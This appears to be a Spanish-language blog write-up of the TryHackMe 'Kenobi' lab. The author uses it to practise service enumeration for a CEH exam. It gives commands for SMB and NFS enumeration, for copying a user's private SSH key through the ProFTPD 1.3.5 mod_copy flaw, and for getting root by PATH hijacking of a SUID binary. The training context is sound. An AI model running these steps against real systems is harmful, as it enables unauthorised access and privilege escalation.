---
layout: post
title: Kenobi | THM Write-Up
description: Write-up de la máquna Kenobi.
tags: [  TryHackMe , seguridad, write-ups ]
---

# Indice

1. [Introducción](#intro)

2. [SMB](#smb)

3. [RPC](#rpc)

4. [FTP](#ftp)

5. [Escalada de privilegios](#escalada)


# Introducción <a id="intro"></a>

Hoy quiero practicar un poco la enumeración de servicios vulnerables para repasar un poco conceptos básicos que me servirán para el examen Certified Ethical Hacker v11 que quiero realizar en las próximas semanas.

Para ello voy a trabajar con la máquina `Kenobi` de TryHackMe, ya que, aunque es sencilla, me servirá para afianzar la teoría y recordarla mejor.


# SMB<a id="smb"></a>

El Server Message Block (SMB) es un protocolo generalmente usado por Windows para compartir archivos, impresoras y otros servicios. Por defecto trabaja en el puerto 445, aunque anteriormente trabajaba en el puerto 139, a través de NetBIOS. Las versiones superiores a Windows 2000 cambiaron esto y ya lo hacen a través del 445 y mediante TCP. 

El puerto 445 es uno de los más preciados por tanto para un ataque, porque si el servicio SMB cuenta con alguna vulnerabilidad, puede  permitir que un atacante lea, borre o modifique archivos.

Empezamos escaneando la máquina. La primera pregunta es ¿cuántos puertos hay abiertos? Lo compruebo con nmap

```
nmap -sS -Pn –min-rate=5000 <ipdelamaquina -sV> 
```

Me aparecen 7 puertos abiertos, entre ellos el 445 y el 111. 

En el siguiente ejercicio, nos piden que hagamos un escaneo con el comando. 

```
nmap -p 445 –script=smb-enum-shares.nse,smb-enum-users.nse <ipdelamaquina>
```

El comando nos devuelve 3 carpetas compartidas. Nos conectamos a una de ellas  ( la carpeta anonymous) con smbclient.

```
smbclient //<ipdelamaquina>/anonymous
```

Y vemos un archivo interesante: `log.txt`. Con el comando smbget podemos bajar todo el contenido de la carpeta, ya que en este caso no hay usuario y contraseña. O bien, `get log.txt` también funcionaría en este caso, ya que sólo nos interesa este archivo.

```
smbget -R smb://<ipdelamaquina>/anonymous
```

Si lo abrimos, vemos que log.txt contiene información acerca del FTP y nos indica dónde esta alojada la llave privada ( en /home/kenobi/.ssh/id_rsa).  Hasta ahora, éste es un ejemplo perfecto ( y tal vez poco realista ) de cómo un servicio SMB puede dar acceso a información privilegiada a cualquiera.



# RPC<a id="rpc"></a>

Como hemos visto antes, el puerto 111 está abierto, y si nos fijamos en la versión del servicio nos aparece que es `rpcbind`. Así que toca hablar de RPC.

RPC o Remote Procedure Call se utiliza para distribuir programas. Es decir, un `portmapper` que permite a un cliente conectarse con un endpoint a través del puerto 111. 

Es decir, cualquier servicio que haya corriendo en la máquina y que esté bajo el protocolo RPC se identifica ante rpcbind y le indica bajo qué dirección se encuentra. De hecho si hiciéramos un nmap con la flag -sV  (como he hecho en la primera parte) para ver qué servicios están corriendo veríamos algo como RPC #100000 y RPC #100227 en el puerto 111 y 2049 respectivamente.

En la descripción del ejercicio ya nos indican que el puerto 111 da acceso a un NFS (Network File System) y que éste puede ser enumerado con nmap de la siguiente manera:

```
nmap -p 111 –script=nfs-ls,nfs-statfs,nfs-showmount <ipdelamaquina>
```

Con este comando podemos ver una carpeta `/var` , accesible por otros usuarios. 

Como nota final, cabe decir que generalmente este puerto se filtra mediante un firewall, para evitar que un atacante pueda comprometer los servicios que corren detrás.


# FTP<a id="ftp"></a>

FTP o File Transfer Protocol se utiliza para transferir archivos mediante el protocolo TCP. Corre por defector tras el puerto 21. 

Típicamente, FTP tiene dos canales: un canal que se dedica a los comandos ( y a veces se le conoce como `canal de control`) y otro dedicado a los datos. Lo problemático de FTP es que la información se transmite en texto plano, por lo que es jugoso para cualquier atacante. Además no requiere de autentificación.

En este caso, la versión que se usa de ProFtpd es la 1.3.5 ( lo he visto cuando he realizado el primer escanéo con nmap y la flag -sV).

Si investigamos un poco con 

```
searchsploit proftpd 1.3.5
``` 

Vemos que esta versión tiene una vulnerabilidad conocida llamada `mod_copy_module`, que permite copiar archivos y directorios mediante los comandos SITE CPFR y SITE CPTO.

Podríamos conectarnos a través del comando `ftp` con:

```
ftp <ipdelamaquina>
``` 

Pero como no conocemos la contraseña, no podemos acceder. Así que la solución sería conectarnos a través de `telnet` o bien `netcat`. Como en la descripción del ejercicio utilizan netcat, voy a hacerlo con telnet para variar.

```
telnet <ipdelamaquina> 21
SITE CPFR /home/kenobi/.ssh/id_rsa
SITE CPTO /var/tmp/id_rsa
```

Lo que acabo de hacer es copiar la llave privada de /home/kenobi/.ssh a /var/tmp. ¿Por qué? Porque tal y como aparecía en log.txt, sabemos que el directorio /var es una carpeta compartida. Así que ahora toca montar esta carpeta en nuestra máquina para tener acceso a su contenido y así poder utilizar la llave privada. 

```
mkdir /mnt/kenobi
sudo mount <ipdelamaquina>:/var /mnt/kenobi
```

Con la llave privada en `/mnt/kenobi/tmp` sólo queda copiarla a nuestro escritorio para así poder darle los permisos adecuados y conectarnos a la máquina víctima mediante ssh. 

```
cp /mnt/kenobi/tmp/id_rsa .
sudo chmod 600 id_rsa
ssh -i id_rsa kenobi@<ipdelamaquina>
cat user.txt
```

Y así conseguimos la primera flag.



# Escalada de privilegios<a id="escalada"></a>

Una vez hecho esto nos explican cómo hacer una escalada de privilegios para convertirse en usuario `root`. Se trataría de explotar un binario con privilegios SUID . Para encontrar archivos con privilegios SUID simplemente hay que hacer:

```
find / -type f -perm -04000 -ls 2>/dev/null
```

Entre los archivos comunes con este tipo de privilegios, hay que uno que resalta y que no suele estar entre los más frecuentes: `/usr/bin/menu`. Corro el binario con:

```
cd /usr/bin
./menu
```

Y me aparecen 3 opciones:
```
1. status check
2. kernel version
3. ifconfig
```

Si intentamos leer el binario con vim , nos aparece un montón de `@^@^` y cosas por el estilo... no olvidemos que se trata de un binario. 

Pero si lo abro con `strings` puedo leerlo en un formato human-readable. Hay una parte del código que es la que utilizaremos para escalar privilegios:


```
curl -I localhost
uname -r
ifconfig
```


Lo que haremos es aprovechar que estos comandos no tienen /usr/bin delante (ni otro directorio dentro del PATH). Así que añadiremos un archivo que se llame `ifconfig` en la carpeta /tmp. Después añadiremos la carpeta /tmp al PATH y así cuando el programa `menu` busque el comando ifconfig, el sistema lo empezará a buscar en las carpetas que están dentro del PATH. Lo encontrará en la carpeta /tmp y ejecutará lo que haya dentro de ese archivo. ¿Y qué habrá dentro de ese archivo? Un simple comando : `/bin/bash`? 

¿ Y cómo nos permite esto escalar privilegios? Porque el binario que lo está ejecutando tiene privilegios de root, por tanto estaremos abriendo una bash con privilegios de root.

NOTA: En la descripción del lab, se explica lo mismo aunque se ejecuta sobre el comando curl. Yo lo he hecho sobre ifconfig por variar un poco.

```
cd tmp
## creamos la bash en el archivo ifconfig y le asignamos permisos de ejecucción
echo /bin/bash > ifconfig
chmod +x ifconfig

## añadimos la carpeta /tmp al $PATH
export PATH=/tmp:$PATH

## ejecutamos el binario menu
/usr/bin/menu
```

Seleccionamos la opción correspondiente (la 3 en este caso) y seremos root. Sólo queda ir al directorio /root y ver la segunda flag ahí.  
